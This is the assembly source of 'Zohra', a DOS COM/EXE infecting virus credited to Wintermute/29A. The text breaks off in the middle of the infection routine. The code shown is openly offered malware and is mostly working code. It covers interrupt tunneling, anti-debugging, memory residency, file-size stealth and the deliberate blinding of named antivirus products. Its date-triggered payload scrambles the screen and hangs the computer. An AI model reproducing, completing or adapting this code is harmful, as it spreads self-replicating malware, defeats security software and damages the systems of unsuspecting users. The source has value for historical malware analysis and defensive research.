   ;²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²±
   ;²²                                       . .: .:.. :.. .. .:.::. :. ..:  ²±
   ; ²   Virus:      Zohra                 <<-==ÜÛÛÛÛÛÜ=ÜÛÛÛÛÛÜ=ÜÛÛÛÛÛÜ===<  ²±
   ; ²   Writer:     Wintermute/29A         .:: ÛÛÛ ÛÛÛ:ÛÛÛ ÛÛÛ.ÛÛÛ ÛÛÛ .:.  ²±
   ; ²   Size:       4004+512 (decryptor)   . .:.ÜÜÜÛÛß.ßÛÛÛÛÛÛ.ÛÛÛÛÛÛÛ:..   ²±
   ; ²   Origin:     Madrid, Spain           ...ÛÛÛÜÜÜÜ:ÜÜÜÜÛÛÛ:ÛÛÛ ÛÛÛ.::.  ²±
   ; ²   Finished:   April/1997             >===ÛÛÛÛÛÛÛ=ÛÛÛÛÛÛß=ÛÛÛ ÛÛÛ=->>  ²±
   ; ²                                      . .:.. ..:. .: ..:.::. ::.. :.:  ²²±
   ; ²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²±
   ;  ±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±
   ;
   ;                                  Features
   ;                                 ÄÄÄÄÄÄÄÄÄÄ
   ;
   ;       Zohra is a slow polymorphic Com/Exe infector that uses Sfts
   ;   to perform its infection. It's double encrypted and gets resident by
   ;   MCB method, reducing the last MCB's size without having to create a new
   ;   one for itself. Also has an encryption routine ( the non-polymorphic
   ;   one ) based on the UUencode system that consists on changing the first
   ;   bit of each byte of the zone to encrypt to 1 and storing it in a buffer
   ;   whose bytes have also a 1 in their most significative bit for being
   ;   restored later; err, ok, it's well explained in the text. The polymorphic
   ;   engine consists on some instructions and routine generators and other
   ;   routines that change the decryption routine randomly ( see the engine ).
   ;
   ;       Also tunnels the int 21h using a code analyzer ( The Tourniquet Kode
   ;   Analyzer ), which can pass through Tbdriver, Virstop, Vshield, etc. Also,
   ;   it has Fcb/Dta/Mcb/Time/"Half-Sft" stealth, and some good retro
   ;   ( anti-antivirus ) that I let you discover by watching the code and
   ;   comments ;-)
   ;
   ;       The payload, a video effect ( non-destructive ), activates on 14th
   ;   of april ( the Spanish Second Republic aniversary ) when any file is
   ;   executed. It will not be possible to execute it from within the article
   ;   reader by pressing "G" due to incompatibility reasons.
   ;
   ;
   ;       Greetings in this virus go to ORP, who brought me valuable
   ;   information about UUencode, and above all to my necromancer, my wizard
   ;   'Zohra', the best of the Forgotten Realms ;)
   ;
   ;       Also greetings to all the 29A, to Marylin Manson, congratulations
   ;   for 'The Roots of Sepultura', greetings to all my friends, to my BBS,
   ;   to my cat, to Ch‚ Guevara, to Tupac Amaru, and to underpants of the
   ;   good luck.
   ;
   ;
   ;      ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;           El viento revuelve s£bitamente las hojas que el oto¤o
   ;              tan cuidadosamente hab¡a depositado en el suelo,
   ;                formando un precioso mosaico de tonos ocres.
   ;
   ;           El sol a£n atisba t¡midamente por encima del horizonte
   ;        recortado por las cruces y las l pidas, y si aguzas el o¡do,
   ;         podr s sentir a los muertos gemir y susurrar los epitafios
   ;                     que nunca fueron grabados en piedra.
   ;
   ;                 La tristeza es un sentimiento de los vivos,
   ;        la soledad una debilidad de los que rezan por no estar solos,
   ;           la fe no sirve a los que no mueren, la muerte eres t£,
   ;        y en tu cripta no hay oscuridad, no hace fr¡o y no est s solo
   ; porque en tu cripta el oto¤o se ha dejado su manto decadente y desconsolado
   ;                          para toda la eternidad.
   ;
   ;                           Su manto te protege...
   ;                         ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;                            ( Gerard Casamayor )
   ;
   ;
   ;   TASM /M2 ZOHRA.ASM
   ;   TLINK ZOHRA.OBJ
   ;

   .286
   HOSTSEG segment BYTE           ; Host program for the first generation
   ASSUME CS:HOSTSEG, SS:CODIGO

   Host:

       mov ax,4c00h
       int 21h

   ends

   CODIGO segment
   ASSUME          CS:CODIGO, DS:CODIGO, ES:CODIGO
   org 00h

   virus_size  equ virus_end-virus_start
   encrypt_size equ encrypt_end-encrypt_start

   Comienzo:

   virus_start label byte

                   push    es ds
                   push    cs cs
                   pop     ds es

                   call    fuera_desencriptado

   encriptado      equ     encrypt_end-encrypt_start
   encrypt_start   label byte

   continuemos:

                   mov     si,29Ah             ; Mapoulas PAUER ! ;)
                   mov     ax,0db15h
                   int     21h
                   cmp     si,29A0h
                   jnz     tunneling
                   jmp     ya_instalado

   ;**************************
   ;                THE TOURNIQUET KODE ANALYZER
   ;                       ---------------------------------

   tunneling:

                   xor     ax,ax           ; Gets int21h handler
                   mov     ds,ax
                   lds     si,ds:[0084h]
                   mov     word ptr cs:[int21h+bp],si
                   mov     word ptr cs:[int21h+bp+2],ds
                   mov     ax,ds
                   cmp     ax,300h         ; If it belongs to Dos, we go and
                   ja      analizar        ;install
                   jmp     tunnel_hecho

   analizar:
                   lodsb                   ; Looks for a byte in ds:si ( where
                   cmp     al,41h          ;the int21h points ), and in the
                   ja      @@mayor_40      ;following code identifies the
                   and     al,00001111b    ;instruction, adding it's size to di
                                           ;and continuing the identification.
                           ; Group < 40h
                   cmp     al,3h
                   ja      @@nointvar
   @@ii:           jmp     @variable_instruction
   @@nointvar:
                   cmp     al,5h           ;This first byte of the place pointed
                   jb      @bytes_2        ;by ds:si is going to tell us in
                   jz      @bytes_3        ;the majority of cases it's length,
                   cmp     al,8h           ;if it's a jmp far, call far, an
                   jb      @bytes_1        ;invalid opcode ( for 8086 ), etc
                   jz      @@ii
                   cmp     al,0ch
                   jb      @variable_instruction   ; Some instructions don't
                   jz      @bytes_2        ;have a fixed length gived by their
                   cmp     al,0dh          ;first byte, so we'll have to see
                   jz      @bytes_3        ;more of them: this, in @variable...
                   ja      @bytes_1

                   ; Group > 40h
   @@mayor_40:
                   cmp     al,60h          ; From 40h to 6fh
                   jb      @bytes_1
                   cmp     al,70h
                   jnb     @@mayor6f
                   jmp     @invalida
                   ; > 6fh
   @@mayor6f:
                   cmp     al,80h
                   jb      @conditional_jmps      ; Conditional jump opcodes
                   ; Mayores a 7fh
                   cmp     al,81h
                   jb      @variable_instruction_1
                   jz      @variable_instruction_2
                   cmp     al,84h
                   jb      @variable_instruction_1
                   cmp     al,8fh
                   jbe     @variable_instruction
               ; A partir de 90h
                   cmp     al,09ah
                   jb      @bytes_1
                   jnz     @@@@@@
                   mov     cx,0ffffh
                   jmp     @posible_salto    ; A far call.
   @@@@@@:
                   cmp     al,0a0h
                   jb      @bytes_1
               ; From 0a0h
                   cmp     al,0a4h
                   jb      @bytes_3
                   cmp     al,0b0h
                   jb      @bytes_1
                   cmp     al,0b8h
                   jb      @bytes_2
                   cmp     al,0c0h
                   jb      @bytes_3
                   cmp     al,0c3h
                   jbe     @invalida ; We take ret as invalid instruction, as
                                   ;we'll ignore any call that is made: won't
                                   ;every call return to the same place ?
               ; From 0c4h
                   jmp     @desdec4



   @conditional_jmps:                  ; jz, jnz, ja...
                   mov     cx,5
   @comparar:
                   cmp     si,word ptr cs:[cond_place]
                   inc     bx          ; We look if we made this jmp just before
                   inc     bx
                   jz      @lo_hacemos ; If we've got Si, we have been there:
                   loop    @comparar   ;we make the conditional jump.
                   mov     bx,word ptr cs:[cond_flag]
                   mov     word ptr cs:[cond_place],si ; If not, we keep SI,
                   inc     si          ; the execution jump, to jump the next
                   jmp     analizar    ;time we pass through there ( to avoid
                                       ;something like [cmp ax,bx-jz xxx-jmp
                                       ;compare], that would hang the computer
   @lo_hacemos:                        ;beeing an infinite loop
                   jmp     @jmpshort
   @bytes_3:
                   inc     si
   @bytes_2:
                   inc     si
   @bytes_1:
                   jmp     analizar

   @invalida:              ; Iret or invalid instruccion found: we don't
                   jmp     ya_instalado        ;install.


   @variable_instruction_2:            ; How this variable instructions work
                   lodsb               ;is explained on the table at the end
                   inc     si          ;of the code analyzer
                   inc     si
                   jmp     @@@instvar2
   @variable_instruction_1:
                   lodsb
                   inc     si
                   jmp     @@@instvar2
   @variable_instruction:
                   lodsb
   @@@instvar2:
                   cmp     al,40h
                   jnb     @@@may_40
                   and     al,00001111b
                   cmp     al,0eh
                   jz      @@variosmas
                   cmp     al,06h
                   jnz     @@variosmas
                   jmp     analizar
   @@variosmas:
                   inc     si
                   inc     si
                   jmp     analizar
   @@@may_40:
                   cmp     al,80h
                   jnb     @@@may_80
                   inc     si
                   jmp     analizar
   @@@may_80:
                   cmp     al,057h
                   jnb     @bytes_1
                   inc     si
                   inc     si
                   jmp     analizar

   @desdec4:

                   cmp     al,0c6h
                   jb      @variable_instruction
                   jz      @variable_instruction_1
                   cmp     al,0c7h
                   jz      @variable_instruction_2
                   cmp     al,0cah
                   jb      @invalida
                   jz      @bytes_3
                   cmp     al,0cch
                   jb      @invalida ; We'll also take a retf as invalid
                   jz      @bytes_1
                   cmp     al,0ceh
                   jb      @bytes_2
                   jz      @bytes_1
                   cmp     al,0cfh
                   jz      @invalida       ; Iret, we return from interrupt.
               ; From 0d0h
                   cmp     al,0d4h
                   jb      @variable_instruction
                   cmp     al,0d6h
                   jb      @bytes_2
                   jz      @invalida
                   cmp     al,0d7h
                   jz      @bytes_1
                   cmp     al,0e0h
                   jb      @variable_instruction
                   cmp     al,0e8h
                   jb      @bytes_2
                   jz      @bytes_3  ; Near call: we ignore it
                   cmp     al,0eah
                   jb      @jmpnext
                   jz      @posible_salto       ; Jmp far
                   cmp     al,0ebh
                   jz      @jmpshort
                   cmp     al,0f1h
                   jb      @go_bytes_1
                   jz      @invalida
                   cmp     al,0feh
                   jb      @go_bytes_1

                   lodsb               ; If a jmp with a register ( jmp Si, for
                   cmp     al,20h      ;example ) is made, we go withouth
                   jb      @valida_ff  ;installing: we can't emulate it because
                   cmp     al,2fh      ;we don't know the registers
                   ja      @valida_ff
                   jmp     ya_instalado
   @valida_ff:
                   jmp     @@@instvar2

   @go_bytes_1:
                   jmp     @bytes_1

   @jmpshort:                  ; Near jump, the nearest 80 bytes up or down:
                   lodsb       ;we check, and make it.
                   xor     ah,ah
                   cmp     al,80h
                   jb      @addit
                   neg     al          ; If it's a jmp to previous code
                   sub     si,ax
                   jmp     analizar

   @jmpnext:       ; 3 bytes
                   lodsw
   @addit:
                   add     si,ax       ; Next jmps are coded E9 XX YY; distance
                   jmp     analizar    ;is = current+3+YYXX

   @posible_salto:         ; Jump to int21h in the code; found a far call/jmp
                   les     dx,ds:[si]  ;that leads us to Dos code
                   mov     ax,es
                   cmp     ax,300h
                   ja      @nomemola
                   mov     word ptr cs:[int21h+bp],dx
                   mov     word ptr cs:[int21h+bp+2],es
                   jmp     tunnel_hecho
   @nomemola:
                   inc     cx              ; If not, we make the jmp in case
                   jz      @passo          ;it's a jmp and not a call, and
                   push    es dx           ;continue analyzing
                   pop     si ds
                   jmp     analizar
   @passo:
                   add     si,4
                   jmp     analizar

   cond_flag:
           db      0
   cond_place:
           dw      0

   ; ****************************************************************************
   ;                               OPCODE TABLE
   ; ----------------------------------------------------------------------------
   ;
   ;  This table is which I made for myself with the 8086 opcodes: I suppose it
   ; will make easier the code analyzer understanding, and maybe it also will
   ; be of use to someone...
   ;
   ;        Length of instructions that can be coded by the Pc ( 8086 )
   ;        -----------------------------------------------------------
   ;
   ;  Those that have special importance for the Code Analyzer ( rets, calls and
   ; jumps ) are signaled. The others are normal instructions of the computer set.
   ;
   ;  Sometimes in "first byte" I include some opcodes; this means that in all
   ; that range the byte conditions and length are the same. Length indicates
   ; how much the instruccion size is ( each interrogation means half byte, two
   ; hexadecimal figures ):
   ;
   ; ****************************************************************************
   ;  Each 7h bytes the same list is repeated, I mean, the bytes size will be
   ; the same at positions 01h, 09h, 10h, 19h, 20h, 29h, 30h and 39h. When
   ; getting to 40h it changes:
   ;
   ;                0 <= Y < 40h
   ;
   ; Y can take any value between them
   ;
   ;  1st byte         2nd byte            next                     length
   ;
   ;  Y0h-Y3h        * Variable instruction
   ;
   ;    Y4h              ??                 -                       2 bytes
   ;
   ;    Y5h              ??                ??                       3 bytes
   ;
   ;  Y6h-Y7h             -                 -                       1 byte
   ;
   ;  Y8h-Ybh        * Variable instruction
   ;
   ;    Ych              ??                 -                       2 bytes
   ;
   ;    Ydh              ??                ??                       3 bytes
   ;
   ;  Yeh-Yfh             -                 -                       1 byte
   ;
   ;
   ;  Next part: All are one byte instructiones, between 40h and 6fh. Although,
   ; instructions between 60h and 6fh ( included ) are invalid.
   ;
   ;  40h-6fh             -                  -                      1 byte
   ;
   ; Part three: Conditional jumps, starting from 70h to 7fh
   ;
   ;  70h-7fh             -                  -                      2 bytes
   ;
   ; Now, a group of different instructions:
   ;
   ;  80h,82h,83h    * Variable instruction ( +1 )
   ;
   ;  81h            * Variable instruction ( +2 )
   ;
   ;  84h-8fh        * Variable instruction
   ;
   ;  Between 90h and 99h there are more one byte instructions, except in 9Ah;
   ; this opcode is the "call far" instruction.
   ;
   ;  90h-99h             -                  -                      1 byte
   ;
   ;  9ah                ??               ?? ?? ??                  4 bytes
   ;
   ;  9bh-9fh             -                  -                      1 byte
   ;
   ; New list, we start from 0a0h
   ;
   ; 0a0h-0a3h           ??                  ??                     3 bytes
   ;
   ; 0a4h-0afh            -                  -                      1 byte
   ;
   ; 0b0h-0b7h           ??                  -                      2 bytes
   ;
   ; 0b8h-0bfh           ??                  ??                     3 bytes
   ;
   ; 0c0h-0c1h          Invalid
   ;
   ; This is a ret [immed]
   ;
   ;   0c2h              ??                  ??                     3 bytes
   ;
   ; Ret
   ;
   ;   0c3h               -                  -                      1 byte
   ;
   ;
   ; 0c4h,0c5h       * Variable instruction
   ;
   ; 0c6h            * Variable instruction ( +1 )
   ;
   ; 0c7h            * Variable instruction ( +2 )
   ;
   ; 0c8h-0c9h          Invalid
   ;
   ; Return far [inmed]
   ;
   ;   0cah              ??                 ??                      3 bytes
   ;
   ; Return far
   ;
   ;   0cbh               -                 -                       1 byte
   ;
   ;   0cch               -                 -                       1 byte
   ;
   ;   0cdh              ??                 -                       2 bytes
   ;
   ;   0ceh               -                 -                       1 byte
   ;
   ; ( Interrup Return )
   ;
   ;   0cfh              -                  -                       1 byte
   ;
   ; 0d0h-0d3h       * Variable instruction
   ;
   ; 0d4h-0d5h          ??                  -                       2 bytes
   ;
   ;   0d6h          Invalid
   ;
   ;   0d7h             -                   -                       1 byte
   ;
   ; 0d8h-0dfh       * Variable instruction
   ;
   ; 0e0h-0e7h          ??                  -                       2 bytes
   ;
   ; Call
   ;
   ;   0e8h             ??                  ??                      3 bytes
   ;
   ; jmp next
   ;
   ;   0e9h             ??                  ??                      3 bytes
   ;
   ; jmp far
   ;
   ;   0eah             ??               ?? ?? ??                   5 bytes
   ;
   ; jmp short
   ;
   ;   0ebh             ??                  -                       2 bytes
   ;
   ; 0ech-0f0h          -                   -                       1 byte
   ;
   ;   0f1h             Invalid
   ;
   ; 0f2h-0fdh          -                   -                       1 byte
   ;
   ;
   ; 0feh-0ffh       * Variable instruction
   ;
   ; ***************************************************************************
   ; ---------------------------------------------------------------------------
   ;
   ;  * Variable instruction ( those which values change depending on the second
   ; byte )
   ;
   ;  A (+1) or a (+2) tells the number of bytes to add to the number of bytes
   ; shown at the column on the right. The values on the left belong to the
   ; second byte red
   ;
   ;
   ;                 If it's < 40h
   ;
   ;                  XEh o X6h           ?? ??                     4 bytes
   ;                <>XEh & <>X6h           -                       2 bytes
   ;
   ;              If 3fh < x < 80h
   ;
   ;                     ??                ??                       3 bytes
   ;
   ;              If 7fh < x < c0h
   ;
   ;                     ??                ??                       4 bytes
   ;
   ;                 If 0bfh < x
   ;
   ;                     ??                 -                       2 bytes
   ;
   ;
   ; *************************** END OF TUNNELING ****************************

   regs2zero:
                   xor     ax,ax           ; Zero registers
                   mov     bx,ax
                   mov     cx,ax
                   cwd
                   mov     si,ax
                   ret

   tunnel_hecho:
                   push    cs
                   pop     ds

   ant_debug:
                   push    ax              ; Anti-debugging routine
                   pop     ax
                   dec     sp
                   dec     sp
                   pop     bx
                   cmp     ax,bx
                   jz      @getmcb
                   mov     ax,4c00h
                   int     21h

   @getmcb:
                   call    get_z_mcb       ; We take the last Mcb

   el_ultimo:
                   pop     dx
                   push    dx
                   cmp     word ptr es:[1],0h      ; Is it free ?
                   jz      parlante                ; If not...
                   cmp     word ptr es:[1],dx      ; Or with active Psp ?
                   jne     ya_instalado
   parlante:
                   cmp     word ptr es:[3],(((virus_size+15)/16)*2)+24h
                   jb      ya_instalado        ; Enough size ?

                   mov     bx,word ptr es:[3]
                   sub     bx,(((virus_size+15)/16)*2)+23h;512 bytes of poly
                   mov     es:[3],bx       ; Mcb Z new size
                   add     di,bx
                   inc     di              ; We point to the program
                   mov     es,di
                   push    di
                   xor     di,di
                   mov     si,bp
                   push    di si
                   mov     cx,virus_size
                   push    cx
                   rep     movsb              ; We copy the virus in memory
                   pop     cx si
                   add     di,201h            ; Re-copy ( 256 bytes ahead )
                   rep     movsb

                   pop     di       ; We copy the decryptor instructions to
                   lea     si,[instr_start+bp] ; keep the originals safe against
                   mov     cx,instrsize        ; our own changes.
                   rep     movsb


                   xor     ax,ax
                   mov     es,ax
                   pop     ax
                   push    ax
                   sub     ax,100h                 ; We reduce 100h bytes the
                   cli                             ;segment and augments 1000h
                   mov     word ptr es:[0086h],ax  ;bytes the offset with the
                   lea     dx,handler_int_21       ;objective that is explained
                   add     dx,1000h                ;at the Int21h handler
                   mov     word ptr es:[0084h],dx  ;( confuse the advanced user )
                   sti

   installed:
                   xor     bp,bp               ; We continue the execution in
                   push    offset ya_instalado ;memory
                   retf

   ya_instalado:
                   pop     ds es

                   mov     ax,ds               ; Is stack segment same as code
                   mov     bx,ss               ;segment ?
                   cmp     ax,bx               ; If it is, we've infected a Com
                   jz      restaura_com        ;file

                   mov     si,ds                   ; We restore the stack
                   add     si,cs:word ptr [ss_sp+bp]
                   add     si,10h
                   cli
                   mov     ss,si
                   mov     sp,cs:word ptr [ss_sp+bp+2]
                   sti

                   mov     si,ds                   ; And now we jump pushing
                   add     si,cs:word ptr [cs_ip+bp+2] ; and with a retf to the
                   add     si,10h                  ; old beggining of the host
                   push    si
                   push    cs:word ptr [cs_ip+bp]

                   call    regs2zero

                   retf                            ; Here has happened nothin !

   restaura_com:
                   push    cs
                   pop     ds
                   push    es
                   mov     di,100h             ; Restores the header ( three
                   push    di                  ;first bytes ) if it's a Com.
                   lea     si,bp+header
                   movsw
                   movsb

                   call    regs2zero
                   push    es
                   pop     ds

                   retf

   get_z_mcb:
                   mov     ah,52h              ; We obtain the List of Lists
                   int     21h
                   mov     di,es:[bx-2]
                   mov     es,di
   loop_da_mcb:
                   cmp     byte ptr es:[0],'Z' ; Search for Mcb 'Z'
                   jnz     @sigue_findin
                   ret
   @sigue_findin:  add     di,es:[3]           ; Mcb Z segment is in ES
                   inc     di
                   mov     es,di
                   jmp     Loop_da_mcb

   call_flag:      dw      0
   infected_flag:  db      0
   push_all_regs:  cli                               ; Pushes all registers
                   pop     cs:word ptr [call_flag]   ;
                   pushf
                   push    ax bx cx dx di si ds es bp
                   push    cs:word ptr [call_flag]
                   sti
                   ret

   pop_all_regs:   cli                               ; Restores all registers
                   pop     cs:word ptr [call_flag]
                   pop     bp es ds si di dx cx bx ax
                   popf
                   push    cs:word ptr [call_flag]
                   sti
                   ret

   ;****************************************************************************
   ;                                 PAYLOAD
   ;----------------------------------------------------------------------------
   ;
   ;  Non destructive, it activates the aniversary of the spanish Second
   ; Republic proclamation ( day 14th of april ), showing some video effects
   ; to the user and printing the virus message.
   ;

   payload:

                   mov     ax,0b800h           ; Where the text page is
                   mov     ds,ax               ; On Ds
                   mov     bx,0100h*8h
   loop_segundo:
                   mov     cx,(80*25*2)
   loop_it:
                   dec     cx
                   mov     si,cx

                   add     word ptr ds:[si-1],4h ; We add 4h to each character
                   loop    loop_it             ;of the screen to change it,
                   dec     bx                  ;it's color...
                   jnz     loop_segundo

                   mov     bx,80*25*2
                   xor     si,si
   loop_decrem:
                   mov     word ptr ds:[bx],0   ; Now, the screan cleaning
                   mov     word ptr ds:[bx-2],0 ;effect
                   mov     word ptr ds:[si],0
                   mov     word ptr ds:[si+2],0

                   push    ax dx           ; Delay for the cleaning: waits the
                   mov     dx,3dah         ;vertical retrazing of the monitor
   del1:           in      al,dx           ;to continue
                   test    al,8
                   jne     del1
   del2:           in      al,dx
                   test    al,8
                   je      del2
                   pop     dx ax
   not_delay:
                   sub     bx,4            ; Pointers for black spaces
                   add     si,4
                   cmp     bx,80*25        ; Have we reached the end ?
                   jnb     loop_decrem

   zohra_text:
                   xor     bx,bx           ; Now we print the Zohra message,
                   xor     di,di           ;that is in 'thetext'
                   push    cs
                   pop     ds
                   lea     si,thetext      ; ( "Zohra will live forever...
                   mov     cx,1            ;  necromancy with her!" )
   @print:
                   mov     ah,2h           ; We place the cursor at the center
                   mov     dx,0c0eh        ;of the screen
                   add     dx,di
                   int     10h

                   mov     bl,02h          ; We print with int10h to give some
                   lodsb                   ;color to this ;)
                   cmp     al,0h
                   jz      acabado
                   mov     ah,09h
                   int     10h

                   inc     di
                   jmp     @print
   acabado:
                   jmp     $                   ; I love hanging computers X-)


   ;****************************************************************************
   ;                             STEALTH DE FCB
   ;----------------------------------------------------------------------------

   fcb_stealth:                    ; Stealth on 11h/12h
                   xchg    ah,al
                   pushf
                   call    dword ptr cs:[Int21h]
                   test    al,al
                   jnz     nada_de_stealth
                   push    es ax bx

                   mov     ah,51h
                   int     21h
                   mov     es,bx
                   cmp     bx,es:[16h]
                   jnz     Not_infected

                   mov     bx,dx
                   mov     al,byte ptr [bx]
                   push    ax
                   mov     ah,2fh
                   int     21h
                   pop     ax
                   inc     al
                   jnz     Normal_FCB
                   add     bx,7h
   Normal_FCB:
                   mov     al,es:[bx+17h]
                   and     al,1eh
                   xor     al,1eh
                   jnz     Not_infected

                   sub     word ptr es:[bx+1dh],Virus_size+202h
                   sbb     word ptr es:[bx+1fh],0
                   and     byte ptr es:[bx+17h],06bh

   Not_infected:
                   pop     bx ax es

   nada_de_stealth:    retf    2

   ;*** 5700h

   time_stealth:
                   xchg    ah,al               ; Returns apparently correct
                   pushf                       ;seconds
                   call    dword ptr cs:[int21h]
                   push    cx
                   and     cl,01eh
                   xor     cl,01eh
                   pop     cx
                   jnz     Vietnow
                   and     cl,0eh
   Vietnow:
                   iret

   ;****************************************************************************
   ;                              NEW INT 21h
   ;----------------------------------------------------------------------------
   ;                  Next motherfucker gonna get my metal

                   ; The int21h handler is in "handler_int_21", after this
                   ;( maybe the user likes the U of debug )

   before:
                   popf
                   xchg    ah,al       ; To avoid Avp's 'trace warning', which
                   cmp     ax,5700h    ;only checks if there is a cmp ah,4bh
                   jz      time_stealth ;instruction
                   cmp     al,11h
                   jz      fcb_stealth
                   cmp     al,12h
                   jz      fcb_stealth
                   cmp     al,4ch
                   jnz     dont_restore_memory
                   dec     byte ptr cs:[flag1]   ; Restores last Mcb size to
                   jnz     @nope2                ;protect our virus after out
                   call    push_all_regs         ;anti-mem routine.
                   call    get_z_mcb
                   sub     word ptr es:[3],((virus_size/16)*2)+22h
                   call    pop_all_regs
   @nope2:         jmp     nope
   dont_restore_memory:
                   cmp     al,03ch
                   je      open_filexz
                   cmp     al,05bh
                   je      open_filexz
                   cmp     al,03dh
                   je      open_filexz
                   cmp     al,06ch
                   je      open_filexz
                   cmp     al,4eh
                   jz      go_handle
                   cmp     al,4fh
                   jnz     non_handle
   go_handle:      jmp     handle
   non_handle:
                   cmp     ax,015dbh
                   jnz     tira_venga
                   jmp     install_check
   tira_venga:     cmp     al,4bh
                   jnz     eing
                   jmp     infeccion

   eing:
                   cmp     al,3fh        ; File read
                   jnz     @nope2
                   jmp     lets_do_stuff

   handler_int_21:

                   pushf                          ; This routine tries to make
                   push    cs                     ;the advanced users believe
                   push    offset before          ;this isn't a virus: the
                   push    bp                     ;offset is bigger than 1100h,
                   mov     bp,sp                  ;so it looks like a normal
                   add     word ptr ss:[bp+4],100h;( and big ) program
                   pop     bp                     ; The routine itself, returns
                   retf                           ;to the real offsets and
                                                  ;tries also not to look like a
                                                  ;virus

   ;****************************************************************************
   ;                            Open file handle
   ;----------------------------------------------------------------------------

   open_filexz:    ; You can kill yourself now because you're dead in my mind

                   xchg    ah,al
                   pushf
                   call    dword ptr cs:[int21h]
                   call    push_all_regs

                   mov     dx,'VA'             ; Avp ( 3.0beta )
                   push    bx
                   call    get_prog_in_env
                   pop     bx
                   jc      tenemos_al_avp

                   mov     dx,'VI'             ; Shitvircible
                   push    bx
                   call    get_prog_in_env
                   pop     bx
                   jc      la_mierda_nos_ronda


                   push    offset @@cont       ; Obtain actual Sft
   @get_da_sft:
                   mov     ax,1220h
                   int     2fh
                   jc      @@go_out
                   xor     bx,bx
                   mov     bl,byte ptr es:[di]
                   mov     ax,1216h
                   int     2fh             ; In ES:DI we get the Sft entry that
   @@go_out:       ret                     ;belongs to the actual file.
   @@cont:
                   jc      go_out
                                  ; If it's infected, we reduce it <virus_size>
                   mov     al,byte ptr es:[di+0dh] ; bytes at the file Sft
                   and     al,01eh                 ;
                   xor     al,01eh
                   jnz     go_out
                   inc     byte ptr [infected_flag]
                   sub     word ptr es:[di+11h],Virus_size+202h
                   sbb     word ptr es:[di+13h],0
                   jmp     go_out

   tenemos_al_avp: cmp     bx,5     ; I check a pair of values of Avp 3.0b when
                   jnz     go_out   ;opening, enough specific to not damage
                   cmp     si,402dh ;older versions: I make zero the opened file
                   jnz     go_out   ;size, and Avp 3.0 will detect NO VIRUSES
                   call    @get_da_sft
                   mov     word ptr es:[di+11h],0
                   mov     word ptr es:[di+13h],0

   go_out:
                   call    pop_all_regs
   definetly:      retf    2

   la_mierda_nos_ronda:

                   cmp     bx,3b20h     ; Ok, I don't think I need more code to
                   jnz     go_out       ;make Shitvircible blind... bah, I'm
                   call    pop_all_regs ;sure in a pair of years it's still
                   stc                  ;unable to detect my Zohra... Zvi Netiv,
                   jmp     definetly    ;guy, your Invircible SUX !!!

   install_check:
                   cmp     si,29Ah     ; If it's in memory it returns 29A0h in
                   jnz     nope        ;SI
                   mov     si,29A0h
                   iret
   nope:
                   xchg    ah,al
                   jmp     salto_a_int21h

   ;****************************************************************************
   ;                            HANDLE STEALTH
   ;----------------------------------------------------------------------------

   handle:
                   xchg    ah,al
                   pushf                           ; Handle stealth, functions
                   call    dword ptr cs:[Int21h]   ;4eh/4fh
                   jc      handle_out
                   pushf
                   push    dx ax es bx di

                   mov     dx,'KP'                 ; Pkunzip, don't stealth
                   call    get_prog_in_env         ;when used
                   jc      not_infec

                   mov     dx,'RA'                 ; Arj, same with it
                   call    get_prog_in_env
                   jc      not_infec

                   mov     dx,'AR'
                   call    get_prog_in_env         ; Rar archive
                   jc      not_infec

                   mov     dx,'UU'
                   call    get_prog_in_env         ; UUencode utilities
                   jc      not_infec

                   mov     dx,'-F'                 ; Anti F-prot's anti-stealth
                   call    get_prog_in_env         ;( doesn't make stealth when
                   jc      not_infec               ;it's executing )

                   mov     ah,2fh
                   int     21h
                   mov     al,es:[bx+16h]
                   and     al,1eh
                   xor     al,1eh
                   jnz     not_infec
                   sub     word ptr es:[bx+1ah],Virus_size+202h
                   sbb     word ptr es:[bx+1ch],0
                   and     byte ptr es:[bx+16h],06bh
   not_infec:
                   pop     di bx es ax dx
                   popf
   handle_out:
                   retf    2

   ;****************************************************************************
   ;                                INFECT !
   ;----------------------------------------------------------------------------

   infeccion:

                   xchg    ah,al
                   call    push_all_regs
                   mov     si,dx
                   mov     di,ds

                   xor     bp,bp           ; For the div
                   mov     ax,3500h
                   int     21h             ; We handle int 00h, divide overflow,
                   push    es bx           ;so we only have to make a 'div bp'
                   mov     ah,25h          ;to jump to int21h, making the
                   push    ax              ;heuristic engines ( even Avp ) not
                   push    cs              ;to have any idea of what we are
                   pop     ds              ;doing
                   lea     dx,rutinadiv
                   int     21h

                   mov     ah,2ah          ; Puts the first number for the
                   div     bp              ;"random" number: month, day, hour
                   mov     word ptr [num_aleat],dx

                                           ; Virus activation:
                   cmp     dx,040eh        ; Fourteenth of april
                   jnz     noche
                   jmp     payload

   noche:
                   mov     ax,3524h
                   div     bp              ; Handling of int24h, avoid errors
                   push    bx es
                   push    cs
                   pop     ds
                   lea     dx,int24h
                   mov     ah,25h
                   div     bp
                   push    ax
                   mov     dx,si
                   mov     ds,di
   loop_exe:                                           ; Do not infect:
                   inc     si
                   cmp     word ptr ds:[si],'BT'       ; Tbav...
                   jz      nos_piramos
                   cmp     word ptr ds:[si],'VA'       ; Avp...
                   jz      nos_piramos
                   cmp     word ptr ds:[si],'CS'       ; Avscan, Xscan, Scan...
                   jz      nos_piramos
                   cmp     word ptr ds:[si],'VI'       ; Invircible
                   jz      nos_piramos
                   cmp     byte ptr ds:[si],0
                   jz      final_cero
                   jmp     loop_exe

   final_cero:
                   mov     byte ptr cs:[flag1],0   ; Is Mem.exe executing ?
                   cmp     ds:[si-7],'EM'
                   jnz     nadarl
                   cmp     ds:[si-5],'.M'
                   jz      memory_test
   nadarl:         cmp     ds:[si-7],'IW'          ; And Windoze ?
                   jnz     noeswin
                   cmp     ds:[si-5],'.N'
                   jz      ant_memory_test
   noeswin:

                   dec     si
                   dec     si
